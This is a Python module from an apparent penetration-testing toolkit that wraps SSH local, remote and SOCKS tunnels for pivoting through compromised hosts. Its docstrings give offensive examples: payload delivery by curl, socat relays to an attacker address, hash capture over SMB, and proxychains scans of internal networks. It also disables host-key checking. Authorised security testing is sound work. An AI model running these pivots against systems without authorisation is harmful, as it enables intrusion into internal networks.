"""
SSH tunnel implementation (-L, -R, -D).

SSH tunneling for port forwarding and SOCKS proxying:
- Local forward (-L): Access internal services via compromised host
- Remote forward (-R): Expose local services to victim
- Dynamic SOCKS (-D): Route all traffic through SOCKS proxy
"""

import subprocess
import time
import socket
from typing import Optional, List
from pathlib import Path

from .models import Tunnel, TunnelConfig
from ..models import Session


class SSHTunnel:
    """SSH tunnel management (-L, -R, -D).

    Handles SSH-based tunneling for pivoting and port forwarding.
    Supports all three SSH tunnel modes with validation.

    SSH Tunnel Types:
        Local Forward (-L):
            ssh -N -L <local_port>:<remote_host>:<remote_port> user@jump_host
            Use case: Access internal service (192.168.1.10:80) via compromised box
            Example: Access victim's internal MySQL from your machine

        Remote Forward (-R):
            ssh -N -R <remote_port>:<local_host>:<local_port> user@jump_host
            Use case: Expose local service to victim (reverse tunnel)
            Example: Expose your SMB server to victim's localhost

        Dynamic SOCKS (-D):
            ssh -N -D <local_port> user@jump_host
            Use case: Route all traffic through SOCKS proxy
            Example: Use proxychains to scan internal network

    Example:
        >>> from sessions.models import Session
        >>> from sessions.tunnel.ssh import SSHTunnel
        >>>
        >>> session = Session(target='192.168.45.150', port=22)
        >>> ssh = SSHTunnel(session, username='user', password='pass')
        >>>
        >>> # Local forward: Access victim's internal MySQL
        >>> tunnel = ssh.local_forward(
        ...     local_port=3306,
        ...     remote_host='192.168.1.10',
        ...     remote_port=3306
        ... )
        >>> # Now: mysql -h 127.0.0.1 -P 3306
        >>>
        >>> # Remote forward: Expose attacker's SMB to victim
        >>> tunnel = ssh.remote_forward(
        ...     remote_port=445,
        ...     local_host='127.0.0.1',
        ...     local_port=445
        ... )
        >>> # Victim can now: smbclient //localhost/share
        >>>
        >>> # Dynamic SOCKS: Route tools through proxy
        >>> tunnel = ssh.dynamic_socks(local_port=1080)
        >>> # Now: proxychains nmap 192.168.1.0/24
    """

    def __init__(self, session: Session, username: str = None,
                 password: str = None, key_file: Path = None,
                 strict_host_checking: bool = False):
        """Initialize SSH tunnel handler.

        Args:
            session: Session instance with target information
            username: SSH username (required)
            password: SSH password (optional, uses key if not provided)
            key_file: Path to SSH private key (optional)
            strict_host_checking: Enable strict host key checking (default: False)

        Example:
            >>> # Password auth
            >>> ssh = SSHTunnel(session, username='user', password='pass')
            >>>
            >>> # Key-based auth
            >>> ssh = SSHTunnel(session, username='user', key_file=Path('/root/.ssh/id_rsa'))
        """
        self.session = session
        self.username = username
        self.password = password
        self.key_file = key_file
        self.strict_host_checking = strict_host_checking
        self.tunnel_process: Optional[subprocess.Popen] = None
        self.current_tunnel: Optional[Tunnel] = None

    def local_forward(self, local_port: int, remote_host: str, remote_port: int,
                     bind_address: str = '127.0.0.1') -> Tunnel:
        """Create SSH local port forward.

        SSH local forward forwards connections from your local machine to a remote host
        through the SSH server (jump host).

        Command:
            ssh -N -L <local_port>:<remote_host>:<remote_port> user@jump_host

        Flags:
            -N: No remote command execution (tunnel only)
            -L: Local port forward
            -f: Background mode (optional, not used here for better control)

        Use Case:
            Access victim's internal services that aren't directly accessible:
            - Internal databases (MySQL, PostgreSQL, MSSQL)
            - Web admin panels (phpMyAdmin, Tomcat Manager)
            - Internal network shares (SMB, NFS)
            - Any TCP service on internal network

        Args:
            local_port: Local port to bind on your machine
            remote_host: Remote host to connect to (from jump host perspective)
            remote_port: Remote port to connect to
            bind_address: Local bind address (default: 127.0.0.1)

        Returns:
            Tunnel instance

        Raises:
            RuntimeError: If tunnel creation fails

        Example:
            >>> # Access victim's internal MySQL server
            >>> tunnel = ssh.local_forward(
            ...     local_port=3306,
            ...     remote_host='192.168.1.10',
            ...     remote_port=3306
            ... )
            >>> print(tunnel.command)
            'ssh -N -L 3306:192.168.1.10:3306 user@192.168.45.150'
            >>>
            >>> # Now connect to MySQL:
            >>> # mysql -h 127.0.0.1 -P 3306 -u root -p
            >>>
            >>> # Access internal web admin panel
            >>> tunnel = ssh.local_forward(
            ...     local_port=8080,
            ...     remote_host='192.168.1.5',
            ...     remote_port=80
            ... )
            >>> # Now browse: http://localhost:8080

        Manual Alternative (OSCP):
            If SSH tunnel fails, use socat or netcat relay on compromised host:
            victim$ socat TCP-LISTEN:3306,fork TCP:192.168.1.10:3306
            attacker$ mysql -h 192.168.45.150 -P 3306
        """
        if not self.username:
            raise ValueError("SSH username is required")

        # Build SSH command
        cmd = self._build_ssh_command()
        cmd.extend([
            '-N',  # No command execution
            '-L', f'{bind_address}:{local_port}:{remote_host}:{remote_port}'
        ])

        # Add target
        cmd.append(f'{self.username}@{self.session.target}')

        # Create tunnel object
        config = TunnelConfig(
            local_port=local_port,
            remote_host=remote_host,
            remote_port=remote_port
        )

        tunnel = Tunnel(
            type='ssh-local',
            session_id=self.session.id,
            target=self.session.target,
            config=config,
            status='starting',
            command=' '.join(cmd)
        )

        # Start tunnel process
        try:
            self.tunnel_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )

            tunnel.pid = self.tunnel_process.pid

            # Validate tunnel (give it time to establish)
            time.sleep(2)

            if self.validate_tunnel(local_port):
                tunnel.mark_active()
            else:
                # Check if process died
                if self.tunnel_process.poll() is not None:
                    stderr = self.tunnel_process.stderr.read().decode('utf-8', errors='ignore')
                    tunnel.mark_error(f"SSH process died: {stderr}")
                    raise RuntimeError(f"SSH tunnel failed: {stderr}")
                else:
                    # Process alive but port not accessible (may need more time)
                    print(f"[!] Warning: Tunnel process started but port {local_port} not yet accessible")

            self.current_tunnel = tunnel
            return tunnel

        except Exception as e:
            tunnel.mark_error(str(e))
            raise RuntimeError(f"Failed to create SSH local forward: {e}")

    def remote_forward(self, remote_port: int, local_host: str = '127.0.0.1',
                      local_port: int = None) -> Tunnel:
        """Create SSH remote port forward (reverse tunnel).

        SSH remote forward exposes a local service to the remote host.
        Connections to remote_port on jump host are forwarded back to your machine.

        Command:
            ssh -N -R <remote_port>:<local_host>:<local_port> user@jump_host

        Flags:
            -N: No remote command execution (tunnel only)
            -R: Remote port forward

        Use Case:
            Expose your local services to victim for exploitation:
            - SMB server for hash capture (responder, impacket-smbserver)
            - HTTP server for payload hosting
            - Reverse proxy for C2 callbacks
            - Any TCP service victim needs access to

        Args:
            remote_port: Port to listen on remote host
            local_host: Local host to forward to (default: 127.0.0.1)
            local_port: Local port to forward to (default: same as remote_port)

        Returns:
            Tunnel instance

        Raises:
            RuntimeError: If tunnel creation fails

        Example:
            >>> # Expose attacker's SMB server to victim
            >>> tunnel = ssh.remote_forward(
            ...     remote_port=445,
            ...     local_host='127.0.0.1',
            ...     local_port=445
            ... )
            >>> print(tunnel.command)
            'ssh -N -R 445:127.0.0.1:445 user@192.168.45.150'
            >>>
            >>> # Victim can now connect:
            >>> # victim$ smbclient //localhost/share -U user
            >>>
            >>> # Expose HTTP server for payload delivery
            >>> tunnel = ssh.remote_forward(
            ...     remote_port=8080,
            ...     local_port=80
            ... )
            >>> # Victim can now: curl http://localhost:8080/payload.sh

        Manual Alternative (OSCP):
            If SSH -R not available, use reverse socat on victim:
            victim$ socat TCP:attacker_ip:445 TCP-LISTEN:445,fork
        """
        if not self.username:
            raise ValueError("SSH username is required")

        if local_port is None:
            local_port = remote_port

        # Build SSH command
        cmd = self._build_ssh_command()
        cmd.extend([
            '-N',  # No command execution
            '-R', f'{remote_port}:{local_host}:{local_port}'
        ])

        # Add target
        cmd.append(f'{self.username}@{self.session.target}')

        # Create tunnel object
        config = TunnelConfig(
            local_port=local_port,
            remote_port=remote_port,
            reverse=True
        )

        tunnel = Tunnel(
            type='ssh-remote',
            session_id=self.session.id,
            target=self.session.target,
            config=config,
            status='starting',
            command=' '.join(cmd)
        )

        # Start tunnel process
        try:
            self.tunnel_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )

            tunnel.pid = self.tunnel_process.pid

            # Give tunnel time to establish
            time.sleep(2)

            # Check if process is alive
            if self.tunnel_process.poll() is None:
                tunnel.mark_active()
            else:
                stderr = self.tunnel_process.stderr.read().decode('utf-8', errors='ignore')
                tunnel.mark_error(f"SSH process died: {stderr}")
                raise RuntimeError(f"SSH tunnel failed: {stderr}")

            self.current_tunnel = tunnel
            return tunnel

        except Exception as e:
            tunnel.mark_error(str(e))
            raise RuntimeError(f"Failed to create SSH remote forward: {e}")

    def dynamic_socks(self, local_port: int = 1080,
                     bind_address: str = '127.0.0.1') -> Tunnel:
        """Create SSH dynamic SOCKS proxy.

        SSH dynamic forward creates a SOCKS proxy that routes all traffic
        through the SSH server (jump host). Use with proxychains/proxifier.

        Command:
            ssh -N -D <local_port> user@jump_host

        Flags:
            -N: No remote command execution (tunnel only)
            -D: Dynamic SOCKS proxy

        Use Case:
            Route all tools through compromised host to access internal network:
            - Network scanning (nmap -sT via proxychains)
            - Web browsing (Firefox SOCKS proxy settings)
            - Exploitation (msfconsole with SOCKS proxy)
            - Any TCP-based tool via proxychains

        Args:
            local_port: Local port for SOCKS proxy (default: 1080)
            bind_address: Local bind address (default: 127.0.0.1)

        Returns:
            Tunnel instance

        Raises:
            RuntimeError: If tunnel creation fails

        Example:
            >>> # Create SOCKS proxy
            >>> tunnel = ssh.dynamic_socks(local_port=1080)
            >>> print(tunnel.command)
            'ssh -N -D 1080 user@192.168.45.150'
            >>>
            >>> # Configure proxychains (/etc/proxychains.conf):
            >>> # [ProxyList]
            >>> # socks5 127.0.0.1 1080
            >>>
            >>> # Use with tools:
            >>> # proxychains nmap -sT 192.168.1.0/24
            >>> # proxychains msfconsole
            >>> # proxychains curl http://192.168.1.10

        Manual Alternative (OSCP):
            If SSH -D not available, use chisel or use SSH -L per service.
            For full pivoting, compromise internal host and repeat process.
        """
        if not self.username:
            raise ValueError("SSH username is required")

        # Build SSH command
        cmd = self._build_ssh_command()
        cmd.extend([
            '-N',  # No command execution
            '-D', f'{bind_address}:{local_port}'
        ])

        # Add target
        cmd.append(f'{self.username}@{self.session.target}')

        # Create tunnel object
        config = TunnelConfig(socks_port=local_port)

        tunnel = Tunnel(
            type='ssh-dynamic',
            session_id=self.session.id,
            target=self.session.target,
            config=config,
            status='starting',
            command=' '.join(cmd)
        )

        # Start tunnel process
        try:
            self.tunnel_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )

            tunnel.pid = self.tunnel_process.pid

            # Validate tunnel (give it time to establish)
            time.sleep(2)

            if self.validate_tunnel(local_port):
                tunnel.mark_active()
            else:
                # Check if process died
                if self.tunnel_process.poll() is not None:
                    stderr = self.tunnel_process.stderr.read().decode('utf-8', errors='ignore')
                    tunnel.mark_error(f"SSH process died: {stderr}")
                    raise RuntimeError(f"SSH tunnel failed: {stderr}")
                else:
                    print(f"[!] Warning: Tunnel process started but SOCKS port {local_port} not yet accessible")

            self.current_tunnel = tunnel
            return tunnel

        except Exception as e:
            tunnel.mark_error(str(e))
            raise RuntimeError(f"Failed to create SSH SOCKS proxy: {e}")

    def validate_tunnel(self, port: int) -> bool:
        """Validate that tunnel is active by checking port.

        Args:
            port: Port to check

        Returns:
            True if port is accessible, False otherwise
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            # Port is accessible if connect succeeded or connection refused
            # (refused = port is listening but not accepting our connection)
            return result in [0, 111]
        except Exception:
            return False

    def close(self):
        """Close tunnel and terminate process."""
        if self.tunnel_process:
            try:
                self.tunnel_process.terminate()
                self.tunnel_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.tunnel_process.kill()
            finally:
                self.tunnel_process = None

        if self.current_tunnel:
            self.current_tunnel.mark_dead('Closed by user')
            self.current_tunnel = None

    def _build_ssh_command(self) -> List[str]:
        """Build base SSH command with common options.

        Returns:
            List of command arguments
        """
        cmd = ['ssh']

        # Disable strict host key checking (default for pentesting)
        if not self.strict_host_checking:
            cmd.extend([
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null'
            ])

        # Add key file if specified
        if self.key_file:
            cmd.extend(['-i', str(self.key_file)])

        # Add password authentication (via sshpass if password provided)
        if self.password and not self.key_file:
            # Use sshpass for password auth
            cmd = ['sshpass', '-p', self.password] + cmd

        return cmd

    def __del__(self):
        """Cleanup on deletion."""
        self.close()
